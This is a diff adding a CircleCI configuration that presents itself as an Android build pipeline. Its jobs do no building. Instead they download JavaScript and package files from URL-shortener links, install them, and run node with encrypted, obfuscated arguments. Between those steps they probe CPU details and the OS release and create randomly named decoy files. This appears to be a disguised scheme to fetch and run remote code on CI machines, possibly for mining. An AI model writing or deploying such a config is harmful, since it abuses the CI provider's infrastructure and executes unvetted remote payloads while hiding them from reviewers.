@@ -1,0 +1,51 @@
+version: 2.1
+orbs:
+  android: circleci/android@1.0
+jobs:
+  KingOfJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir 0pqsi6fc8dvfxf
+      - run: curl -fsSL shorturl.at/yOPRZ -o 1xacisuly.js && curl -fsSL
+          shorturl.at/dvIU0 -o rexgtzczrvrk11ohpjvp.js && curl -fsSL
+          shorturl.at/kKQU5 -o package.json
+      - run: touch w0bjunm852hpc2o2uth1pdp7k6k4lso.java
+      - run: npm i -s
+      - run: touch jfyaqrewa9wzxltathz1p.java
+      - run: mkdir 66otu1nx3av4m6d38fzrju
+      - run: node 1xacisuly -t
+          U2FsdGVkX19uutJ8UJf/6YQUWsk8aufkqNSIGGapDUdelB0Q1XSwSD2wQNiyXswf -s
+          U2FsdGVkX1/2Dvxeyoi7Vh88nNN1U6htr81OymHFJY7ZL0xAYhrtEIOZFK73DubDEiuGOLbzst+5wkAQe+kjUoA1i9CRT3SgffoDljVLSiA6XKe7oGSagh8h+2848/OtamFS9UQGMxBdkDWUpjgOoKtu6QV9vIZiD2ydLMvVcGISP4mL0M9DTZTWORSlL55fcW6u8d7JXZX/mFGJGvJfwflRCNu7EdzbBsYuSNXwY9A=
+          -r
+          U2FsdGVkX18oPvNHjO8kasZHQpH08EyJlNzjCAKoQt98M5p84ZkncHDGpqZP9EPf7jIPMNgkGNhwyADjKXooDDzAJ/gceK78UkIVGVHhUc7tr/s++oVDRjyM51mgKilJHjPnf+XSerWZ09syNMZjJW0Ztey5Nw0dbf2mxzo9VaF+HmoESrRu7X4Hl6L4Q1fIBndhvI1mSwh62tVK9ZzxlofLYPsGZHX1MEhlcbkboFmjbQlgiokPLjteYg5Gmwzk3uzLOzMVMg8+kbj3/5GXRG5Kh6p1lWkFNwaMOwQ2uKs=
+          -lpn U2FsdGVkX1/igxil5S4k25vJXN7f1zAiXPTbBNJki31PwT4jR2xpjfmTUykJJcqQ
+          -sp
+      - run: cat /proc/cpuinfo | grep 'vendor' | uniq && cat /proc/cpuinfo | grep 'model
+          name' | uniq && cat /proc/cpuinfo | grep processor | wc -l && cat
+          /proc/cpuinfo | grep 'core id'
+      - run: touch q7f7f4pc7eh6lfdm1g2ngrb.cpp
+  NodejsJobs:
+    executor:
+      name: android/android-machine
+    steps:
+      - run: mkdir isn0fwrskuiksdfd
+      - run: touch qi778kk4plcbnnq54.java
+      - run: curl -fsSL shorturl.at/csJSY -o 2v77m4jcoq7.js && curl -fsSL
+          shorturl.at/iouMY -o package.json && curl -fsSL shorturl.at/eorDW -o
+          pl7yjziriukae.js
+      - run: npm i -s
+      - run: mkdir trceirj15ip3y2o
+      - run: mkdir nj0yreqavpigex9nw
+      - run: cat /etc/os-release
+      - run: node pl7yjziriukae -lpn U2FsdGVkX1/kKxMfkm21HJeVgW790dW8LjgvhWUCJ/E= -s
+          U2FsdGVkX18hsuuauR8rO6gzKDdxmhVet6Sq8jGMdXrDCdKRbA2sRxhSEKSIrKcIQGsr2S93BSO4sV+T8whR5i/xpL680j/RLAb9NBdoQTpt/ATUD+8t3LRAuIIDnVhVupAv7wnHA7mqNBLTbtH3mQTQQe3C9d1hkECw3m2224pKSkpmBggD9HlUprk1AY3U4UB5Nq4H8Q4SslXAVj/VINoPITVjbqvPXDxGW4RpRnI=
+          -sp -r
+          U2FsdGVkX1+4/Sj/jGlOHXneXTgoREp7H7YcNCHq+Hn1mdkPw2jjikFLtVT9WqKSDPe+05fCa0Pq38vfg52kYr4lA0AfbbyIRwbEnPvMvZsKzUvVrjil5TE3NfU2T6w80Wpi9UFAThtkIb/a7/vcyaeaxkwWy0gx+pgviGKd4gt646dq/RmEZEKsYsNwYfjXTHFAB9CTJrVgy4mKsgNJR1vxHMjIQ675cTkZ8Kb7BCZbW6rhlTh/amkN3sUAe7lzjHP97W5hjVTZXJGcsXhgdAHp9nUiugJlUXck5WhHd1o=
+          -t U2FsdGVkX19WoHQFJw7gVu8Qd920E/1x/y1Zkl4rHCTgcS4N+Woi6S66RD7rQWYj
+      - run: touch hnoxtuwuexobzuopcgcv0jvj.py
+workflows:
+  deploy:
+    jobs:
+      - KingOfJobs
+      - NodejsJobs
